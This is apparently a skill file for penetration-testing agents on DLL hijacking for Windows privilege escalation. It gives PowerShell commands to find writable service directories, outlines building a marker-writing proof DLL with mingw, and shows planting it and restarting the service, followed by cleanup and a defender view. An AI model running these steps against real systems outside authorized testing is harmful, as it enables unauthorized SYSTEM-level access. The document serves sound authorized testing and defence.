---
name: dll-hijacking
description: Use when you have a Windows shell on an authorized engagement
  and need to check for DLL hijacking privilege escalation. Covers finding
  missing DLLs with ProcMon-style analysis, writable DLL search paths, and
  planting a proof DLL. Use when services load DLLs from writable
  locations, when WinPEAS flags hijackable paths, or when application
  directories are user-writable.
version: 1.0.0
domain: privesc
lifecycle: stable
last_verified: 2026-10-23
parent: privesc-windows
requires: [privesc-windows]
extends: []
relates: [privesc-linux]
tools:
  - name: PowerShell
    version: 7.4
  - name: Python
    version: 3.12
---

DLL hijacking plants a malicious library where a privileged process looks
for one: missing DLLs, writable application directories, and unsafe search
order all create the opening. This skill covers finding hijackable DLL
loads on authorized engagements and proving them with a benign DLL. It is
quieter than service binary replacement and works against both services
and scheduled tasks.

## Quick Workflow

1. Find privileged processes that load DLLs from interesting locations.
2. Identify missing DLLs (NAME NOT FOUND) and writable directories in the
   search order.
3. Verify the loading process runs as SYSTEM or an admin.
4. Craft a proof DLL that writes a marker on load.
5. Plant it with approval and trigger the load.
6. Confirm the marker and remove the DLL.

## 1. Finding hijackable loads

```powershell
# Services with binaries in writable directories are prime candidates
Get-CimInstance Win32_Service | Select-Object Name, PathName, StartName |
  Where-Object { $_.PathName -like '*Program Files*' }

# Check the application directory writability for a candidate service
$svcDir = 'C:\Program Files\VulnApp'
(Get-Acl $svcDir).Access | Where-Object {
  $_.IdentityReference -like '*Users*' -and $_.FileSystemRights -like '*Write*' }

# On a lab replica, ProcMon shows the exact missing DLL:
# Filter: Process Name = service.exe, Result = NAME NOT FOUND, Path ends .dll
```

The ideal case is a SYSTEM service whose directory you can write to and
which tries to load a DLL that does not exist. Your DLL with that exact
name gets loaded at the next service start.

## 2. Search order weaknesses

```powershell
# Check the system DLL search order configuration
reg query "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager" /v SafeDllSearchMode

# Application directory comes first in the default order, which is why
# writable app directories are the main target

# Phantom DLL check: strings on the service binary for LoadLibrary calls
# without full paths (do this on a copied binary in your lab)
```

`SafeDllSearchMode` on (the default since XP SP2) still puts the
application directory first. The defense that matters is the ACL on that
directory, not the search order.

## 3. Proof DLL and trigger

```bash
# Build a minimal DLL that writes a marker on load (on your attack box)
# DllMain -> CreateFile/WriteFile C:\dll_proof.txt, then return TRUE
# Compile with: x86_64-w64-mingw32-gcc -shared -o hijack.dll hijack.c
```

```powershell
# Plant as the missing DLL name in the writable directory (with approval)
copy C:\Users\test\hijack.dll 'C:\Program Files\VulnApp\missing.dll'

# Trigger: restart the service or wait for its schedule
sc.exe stop "VulnService"; sc.exe start "VulnService"

# Confirm the marker, then remove the DLL immediately
type C:\dll_proof.txt
del 'C:\Program Files\VulnApp\missing.dll'; del C:\dll_proof.txt
```

Keep the DLL minimal and side-effect free: write the marker and exit.
A crashing DLL in a SYSTEM service is an availability incident, not a
finding.

## Edge cases

- The DLL loads but as the wrong user. Check the service account; a
  NETWORK SERVICE load is still progress (lateral movement), not the
  SYSTEM win.
- DLL signing or allow-listing blocks your DLL. Note the control as a
  positive finding for that application.
- The directory is writable but the service never restarts. Note it as
  reboot-dependent, or look for a trigger (scheduled task, admin action).
- Multiple candidate DLLs exist. Plant one at a time and test; planting
  several confuses the diagnosis when something loads.

## Escalation

- No hijackable loads: return to the privesc-windows order;
  unquoted-service-paths and token-impersonation have higher hit rates.
- You need the exact missing DLL name: replicate the application in a
  lab and run ProcMon there; guessing names on production wastes the
  window.
- The hijack works but you need persistence: persistence is a separate
  decision with separate approval; prove privesc first.

## Detection and defender view

Defenders see DLL hijacking as a new DLL in an application directory
(FIM alert) and a privileged process loading an unsigned or unexpected
library (Sysmon ImageLoad events, EDR). Defenses are locked-down
application directory ACLs, DLL signing requirements, Sysmon monitoring
of ImageLoad for unsigned DLLs in privileged processes, and removing
phantom DLL dependencies from the software itself.

## Key references

- MITRE ATT&CK T1574.001 (Hijack Execution Flow: DLL Search Order
  Hijacking).
- MITRE ATT&CK T1574.002 (Hijack Execution Flow: DLL Side-Loading).
- CWE-427 (Uncontrolled Search Path Element).
- Microsoft documentation on DLL search order.
